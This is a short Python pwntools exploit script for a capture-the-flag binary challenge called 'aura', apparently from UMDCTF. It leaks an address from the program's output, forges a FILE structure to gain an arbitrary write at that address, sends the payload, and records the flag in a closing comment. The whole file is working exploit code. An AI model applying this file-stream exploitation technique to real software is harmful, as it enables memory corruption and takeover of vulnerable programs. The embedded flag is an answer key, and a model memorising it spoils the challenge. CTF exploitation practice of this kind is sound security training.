from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./aura_patched', '''
    b *(main+181)
    b *(main+216)  
    continue
''')

# p = remote('challs.umdctf.io', 31006)

p.recvuntil(b'my aura: ')
aura_addr = int(p.recvline().strip().decode(), 16)
log.info(f'aura address: {hex(aura_addr)}')

p.recvuntil(b'ur aura? ')
fs = FileStructure(0)
payload = fs.read(aura_addr, 0x8+0x8)
p.send(payload)
p.send(b'A'*0x8)

p.interactive()

# UMDCTF{+100aur4}